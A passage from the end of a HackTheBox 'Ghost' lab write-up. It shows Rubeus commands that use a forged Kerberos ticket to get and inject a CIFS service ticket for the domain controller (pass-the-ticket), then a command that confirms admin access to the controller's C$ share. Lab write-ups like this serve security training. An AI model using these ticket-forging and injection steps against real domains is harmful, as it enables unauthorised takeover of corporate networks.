The forged TGT is for the `GHOST.HTB` realm. Use Rubeus to request a service ticket for CIFS (SMB) on the DC and inject it into the current session:

```powershell
.\Rubeus.exe asktgs \
  /dc:dc01.ghost.htb \
  /service:cifs/dc01.ghost.htb \
  /ticket:ticket.kirbi \
  /nowrap \
  /ptt
```

- `/ptt` — **Pass-the-Ticket**: injects the TGS directly into the current Kerberos session cache
- `/nowrap` — prevents base64 line wrapping in the output

<img width="1642" height="441" alt="Pasted image 20260610214657" src="https://github.com/user-attachments/assets/c2805365-3dde-4709-99ef-096354418e47" />

<img width="431" height="192" alt="Pasted image 20260610214725" src="https://github.com/user-attachments/assets/c5fe999c-6e8e-4dcf-aa99-55d1950470f5" />

### Step 4 — Confirm Domain Admin Access

```powershell
dir \\dc01.ghost.htb\C$
```

The directory listing of the DC's C drive returned successfully. Full `Enterprise Admin` equivalent access on `GHOST.HTB` confirmed.

---

## Flags

<img width="710" height="118" alt="vmware_wgUhoNsU2P" src="https://github.com/user-attachments/assets/6d31a5be-e9c4-4752-b7c9-8b22739a7865" />


---

_Writeup by ctxzero — HackTheBox: Ghost_
